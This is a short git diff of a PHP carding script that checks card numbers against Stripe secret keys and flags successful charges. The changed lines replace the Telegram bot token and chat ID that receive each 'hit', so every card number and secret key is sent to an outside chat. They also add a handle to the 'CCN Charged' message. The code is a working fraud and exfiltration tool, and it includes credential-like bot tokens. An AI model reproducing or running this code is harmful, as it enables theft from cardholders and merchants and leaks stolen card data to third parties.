@@ -139,8 +139,8 @@ break;
 
 // ---------------------------------------------------- Hit To Telegram Start----------------------------
 $domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
-$botToken = urlencode('6190237258:AAHUvG8uS3ezcg2bOjd3_Za0YKlkF_ErE0M');
-$chatID = urlencode('-1001989435427');
+$botToken = urlencode('6366773556:AAEq6i4JDHVhGOD3W9__qI8dSg3Pl_kXKT4');
+$chatID = urlencode('-990983895');
 
 $charged_message = "CC:$lista\r\n➤ SK Key:$sk\r\n";
 
@@ -158,7 +158,7 @@ if(strpos($result2, '"seller_message": "Payment complete."' )) {
   
     echo '<span class="badge badge-success"><b>#CHARGED</b></span> <font class="text-white"><b>'.$lista.'</b></font> <font class="text-white">
     <br>
-    ➤ Response: $'.$amt.' CCN Charged ✅
+    ➤ Response: $'.$amt.' CCN Charged @malihajee
     <br>
     ➤ Receipt: <span style="color: green;" class="badge"><a href="' . $receipturl . '"  target="_blank"><b>Here</b></a></span>
     <br>
